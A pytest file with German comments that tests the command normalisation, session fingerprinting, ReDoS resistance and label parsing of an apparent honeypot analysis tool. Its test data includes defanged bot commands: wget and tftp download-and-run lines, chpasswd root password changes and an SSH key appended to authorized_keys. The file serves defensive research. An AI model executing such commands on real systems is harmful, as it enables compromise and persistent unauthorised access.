"""Normalisierung, Fingerprint und Labels für Kampagnen (Schritt 6.2, ohne Datenbank).

Alle Befehle sind von Hand geschrieben: Adressen aus Dokumentationsnetzen
(RFC 5737) und schon entschärft, Schlüssel und Passwörter erfunden.
"""

from __future__ import annotations

import re
import time
from pathlib import Path
from re import _parser as sre_parse

import pytest

from app.attack import _check_structure
from app.campaigns import (
    LABELS_PATH,
    MAX_INPUT,
    MIN_SESSIONS,
    PATTERNS,
    SSH_KEY,
    LabelsError,
    fingerprint,
    key_placeholder,
    load_labels,
    normalize,
    normalized_sequence,
    opening_hash,
    parse_labels,
)
from app.defang import defang

# Erfundene Schlüssel: Kopf von ssh-ed25519, danach Füllzeichen.
BODY_ONE = "AAAAC3NzaC1lZDI1NTE5AAAAI" + "Q" * 43
BODY_TWO = "AAAAC3NzaC1lZDI1NTE5AAAAI" + "R" * 43


# --- Gleiche Bots, andere Zufallswerte -------------------------------------------


@pytest.mark.parametrize(
    "first, second",
    [
        # Passwort in user:pw-Form
        ('echo "root:Xy7aB2kLmQ"|chpasswd|bash', 'echo "root:q9W3eRt5Zp1"|chpasswd|bash'),
        ("echo root:geheim1|chpasswd", "echo root:anders22|chpasswd"),
        # Zufälliger Ordnername aus Buchstaben und Ziffern
        ("mkdir /tmp/.k2j4h5g6 && cd /tmp/.k2j4h5g6", "mkdir /tmp/.Zx9Yw8Vu && cd /tmp/.Zx9Yw8Vu"),
        # Langer Hex-Wert, etwa eine Kennung
        ("echo deadbeefcafebabe0123 > /tmp/id", "echo 0011223344556677aabb > /tmp/id"),
        # Andere Download-Adresse, gleicher Ablauf
        (
            "cd /tmp; wget hxxp://198[.]51[.]100[.]7/x.sh; sh x.sh",
            "cd /tmp; wget hxxps://beispiel[.]test/y/z.sh; sh x.sh",
        ),
        # Andere Adresse ohne Schema
        ("ping -c 1 192[.]0[.]2[.]10", "ping -c 3 203[.]0[.]113[.]99"),
        # Zahlen in Argumenten
        ("sleep 5; kill -9 1234", "sleep 30; kill -9 777"),
        # Leerraum
        ("uname   -a;\twhoami", "uname -a; whoami  "),
    ],
)
def test_the_same_bot_line_with_another_random_value_is_equal(first, second):
    assert normalize(first) == normalize(second)


@pytest.mark.parametrize(
    "command, expected",
    [
        ('echo "root:Xy7aB2kLmQ"|chpasswd', 'echo "root:<PW>"|chpasswd'),
        ("wget hxxp://198[.]51[.]100[.]7/x.sh; sh x.sh", "wget <URL>; sh x.sh"),
        ("ssh 198[.]51[.]100[.]7:22", "ssh <IP>:<N>"),
        ("cat /tmp/.a1B2c3D4e5", "cat /tmp/.<TOKEN>"),
        ("echo 0123456789abcdef0123", "echo <HEX>"),
        ("head -n 10 /etc/passwd", "head -n <N> /etc/passwd"),
    ],
)
def test_placeholders(command, expected):
    assert normalize(command) == expected


@pytest.mark.parametrize(
    "command",
    [
        "uname -a",
        "python3 -V",
        "ls /lib/x86_64-linux-gnu",
        "cat /proc/cpuinfo | grep name | wc -l",
        "export PATH=$PATH:/usr/sbin",
        "echo <src> <dst>",
    ],
)
def test_ordinary_commands_stay_as_they_are(command):
    assert normalize(command) == command


def test_different_commands_stay_different():
    assert normalize("uname -a") != normalize("uname -m")
    assert normalize("cat /etc/passwd") != normalize("cat /etc/shadow")


# --- SSH-Schlüssel -----------------------------------------------------------------


def key_line(body: str, spacing: str = " ") -> str:
    return f'echo "ssh-ed25519{spacing}{body} comment">>.ssh/authorized_keys'


def test_two_different_ssh_keys_stay_different():
    assert normalize(key_line(BODY_ONE)) != normalize(key_line(BODY_TWO))


def test_the_same_key_is_recognised_again():
    assert normalize(key_line(BODY_ONE)) == normalize(key_line(BODY_ONE, spacing="  "))


def test_a_key_becomes_a_short_hash_of_its_body():
    placeholder = key_placeholder(BODY_ONE)
    assert re.fullmatch(r"<KEY:[0-9a-f]{12}>", placeholder)
    assert normalize(key_line(BODY_ONE)) == (
        f'echo "ssh-ed25519 {placeholder} comment">>.ssh/authorized_keys'
    )
    assert BODY_ONE not in normalize(key_line(BODY_ONE))


def test_the_key_placeholder_is_not_normalised_again():
    """Die zwölf Hex-Zeichen dürfen nicht zu <TOKEN> oder <PW> werden."""
    normalized = normalize(f"echo ssh-rsa {BODY_ONE} x; echo ssh-rsa {BODY_TWO} y")
    assert normalized.count("<KEY:") == 2
    assert "<TOKEN>" not in normalized and "<PW>" not in normalized


def test_a_typed_key_placeholder_cannot_pose_as_a_key():
    typed = normalize(f"echo {key_placeholder(BODY_ONE)}")
    assert typed != normalize(f"echo ssh-ed25519 {BODY_ONE}")
    assert key_placeholder(BODY_ONE) not in typed


# --- Entschärfung bleibt -------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "wget hxxp://198[.]51[.]100[.]7/a; curl hxxps://beispiel[.]test",
        "ping 203[.]0[.]113[.]5",
        "echo beispiel[.]test 1[.]2[.]3",
        "tftp -g -r x fxp://192[.]0[.]2[.]1",
    ],
)
def test_normalising_never_restores_a_defanged_address(command):
    normalized = normalize(command)
    assert defang(normalized) == normalized
    assert not re.search(r"(https?|t?ftp)://", normalized, re.IGNORECASE)
    assert not re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", normalized)


def test_nothing_that_is_not_text_is_a_command():
    assert normalize(None) == ""
    assert normalize(42) == ""
    assert normalize("   ") == ""


# --- Fingerprint -------------------------------------------------------------------


def test_repeated_commands_in_a_row_count_once():
    assert normalized_sequence(["uname -a", "uname  -a", "id", "uname -a", ""]) == [
        "uname -a",
        "id",
        "uname -a",
    ]


def test_the_fingerprint_depends_on_order_and_kind():
    one = fingerprint("exec", ["uname -a", "id"])
    assert one is not None and re.fullmatch(r"[0-9a-f]{64}", one)
    assert fingerprint("exec", ["id", "uname -a"]) != one
    assert fingerprint("interactive", ["uname -a", "id"]) != one
    assert fingerprint("exec", normalized_sequence(["uname -a", "uname -a", "id"])) == one


def test_a_session_without_commands_has_no_fingerprint():
    assert fingerprint("exec", []) is None
    assert fingerprint("interactive", normalized_sequence(["", "  "])) is None


def test_the_kind_must_be_known():
    with pytest.raises(ValueError):
        fingerprint("irgendwas", ["id"])


def test_the_opening_hash_only_looks_at_the_first_three():
    assert opening_hash(["a", "b", "c", "d"]) == opening_hash(["a", "b", "c", "x", "y"])
    assert opening_hash(["a", "b", "c"]) != opening_hash(["a", "b", "x"])
    assert re.fullmatch(r"[0-9a-f]{6}", opening_hash([]))


def test_at_least_five_sessions_make_a_campaign():
    assert MIN_SESSIONS == 5


# --- ReDoS ---------------------------------------------------------------------------


def test_every_pattern_passes_the_check_from_the_attack_rules():
    for pattern in (SSH_KEY, *(p for p, _ in PATTERNS)):
        _check_structure(sre_parse.parse(pattern.pattern))


HOSTILE = {
    "hex": "a" * MAX_INPUT,
    "digits": "1" * MAX_INPUT,
    "alnum": "a1" * (MAX_INPUT // 2),
    "letters then one digit": "a" * (MAX_INPUT - 1) + "1",
    "colons": "a:" * (MAX_INPUT // 2),
    "user without colon": "a" * MAX_INPUT,
    "name then colon": "a" * (MAX_INPUT - 1) + ":",
    "key body": "ssh-rsa AAAA" + "A" * (MAX_INPUT - 12),
    "key starts": "ssh-rsa AAAA " * (MAX_INPUT // 13),
    "key types": "ssh-rsa  " * (MAX_INPUT // 9),
    "defanged": "1[.]" * (MAX_INPUT // 4),
    "addresses": "1[.]1[.]1[.]1" * (MAX_INPUT // 13),
    "schemes": "hxxp://" * (MAX_INPUT // 7),
    "whitespace": " \t\n" * (MAX_INPUT // 3),
    "mixed": "aB3-" * (MAX_INPUT // 4),
    "underscores": "a_1" * (MAX_INPUT // 3),
}


@pytest.mark.parametrize("name", HOSTILE)
def test_hostile_input_of_8192_characters_is_fast(name):
    text = HOSTILE[name]
    started = time.perf_counter()
    normalize(text)
    assert time.perf_counter() - started < 0.1


def test_longer_input_is_cut():
    assert normalize("a " * MAX_INPUT) == normalize("a " * (MAX_INPUT // 2))


# --- Labels --------------------------------------------------------------------------


def entry(**overrides):
    return {"prefix": "0123456789ab", "label": "Probe", "description": "Nur ein Test.", **overrides}


def test_the_label_file_in_the_repo_is_valid():
    assert isinstance(load_labels(LABELS_PATH), dict)


def test_valid_labels_are_read():
    labels = parse_labels({"campaigns": [entry(), entry(prefix="ba9876543210", label="Zweite")]})
    assert labels["0123456789ab"].label == "Probe"
    assert labels["ba9876543210"].description == "Nur ein Test."


def test_an_empty_list_is_fine():
    assert parse_labels({"campaigns": []}) == {}
    assert parse_labels({"campaigns": None}) == {}


@pytest.mark.parametrize(
    "data, reason",
    [
        (None, "campaigns"),
        ({"labels": []}, "campaigns"),
        ({"campaigns": "x"}, "Liste"),
        ({"campaigns": ["x"]}, "kein Objekt"),
        ({"campaigns": [entry(prefix="0123456789AB")]}, "prefix"),
        ({"campaigns": [entry(prefix="0123456789a")]}, "prefix"),
        ({"campaigns": [entry(prefix=123456789012)]}, "prefix"),
        ({"campaigns": [entry(label="x" * 65)]}, "label länger"),
        ({"campaigns": [entry(label="")]}, "label fehlt"),
        ({"campaigns": [entry(label="a\x1b[2Jb")]}, "Steuerzeichen"),
        ({"campaigns": [entry(description="x" * 1001)]}, "description länger"),
        ({"campaigns": [entry(description=None)]}, "description fehlt"),
        ({"campaigns": [entry(extra="x")]}, "unbekannter Schlüssel"),
        ({"campaigns": [entry(), entry(label="Andere")]}, "prefix doppelt"),
        ({"campaigns": [entry(), entry(prefix="ba9876543210")]}, "label doppelt"),
    ],
)
def test_invalid_labels_are_refused(data, reason):
    with pytest.raises(LabelsError, match=reason):
        parse_labels(data)


def test_a_description_may_span_lines():
    labels = parse_labels({"campaigns": [entry(description="Zeile eins\nZeile zwei")]})
    assert "\n" in labels["0123456789ab"].description


def test_broken_yaml_is_refused(tmp_path: Path):
    path = tmp_path / "campaigns.yml"
    path.write_text("campaigns: [\n", encoding="utf-8")
    with pytest.raises(LabelsError, match="YAML"):
        load_labels(path)
